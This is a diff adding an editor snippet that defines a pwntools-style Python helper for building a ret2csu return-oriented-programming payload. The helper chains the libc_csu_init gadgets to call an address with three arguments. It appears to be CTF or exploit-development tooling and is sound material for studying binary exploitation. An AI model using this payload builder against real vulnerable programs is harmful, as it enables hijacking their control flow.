@@ -1,0 +1,16 @@
+# -*- mode: snippet -*-
+# name: csu_gadget
+# key: csu_gadget
+# --
+
+def csu_gadget(call_addr, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
+    payload  = p64(csu_last)         # pop rbx,rbp,r12,r13,r14,r15, ret
+    payload += p64(0x0)              # rbx = 0x0
+    payload += p64(0x1)              # rbp = 0x1
+    payload += p64(call_addr)        # r12 = call_addr
+    payload += p64(arg3)             # r13 -> rdx    arg3
+    payload += p64(arg2)             # r14 -> rsi    arg2
+    payload += p64(arg1)             # r15 -> edi    arg1
+    payload += p64(csu_middle)       # wait to call [rbx + r12 * 0x8]
+    payload += 'A' * 56              # junk
+    return payload
